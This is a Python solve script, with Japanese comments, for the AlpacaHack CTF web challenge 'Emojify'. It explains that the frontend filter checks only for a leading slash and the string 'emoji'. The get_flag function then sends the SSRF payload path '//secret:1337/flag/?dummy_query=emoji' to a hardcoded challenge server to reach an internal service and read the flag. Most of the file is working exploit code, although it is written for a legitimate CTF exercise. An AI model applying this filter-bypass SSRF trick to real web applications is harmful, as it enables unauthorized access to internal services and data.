"""Emojify

問題url: https://alpacahack.com/challenges/emojify

Note: frontend/index.jsでのwafは以下2つだけ
    1. 最初が '/' で始まること
    2. "emoji" の文字列がどこかに含まれていること
    
    secret:1337/flag にリクエストを送ればフラグが取得できる。
    あとはパスを工夫して上の2つの条件を満たすようにするだけ。
    無理やり "?dummy_query=emoji" を付けることで条件達成できてそう。
"""

import requests

URL = "http://34.170.146.252:11450/"  # FIXME: ここに本番のURLを入れる


def get_requests(text: str = "pizza") -> requests.Response:
    """指定されたテキストの絵文字を取得する

    Note: http://34.170.146.252:11450/api?path=/emoji/pizza
    """
    api_url = URL + "api"
    res = requests.get(api_url, params={"path": "/emoji/" + text}, timeout=5)
    return res


def get_flag():
    """フラグを取得する"""
    api_url = URL + "api"
    res = requests.get(
        api_url,
        params={"path": "//secret:1337/flag/?dummy_query=emoji"},
        timeout=5,
    )
    return res


if __name__ == "__main__":
    res = get_flag()

    print(res.status_code)
    print(res.text)
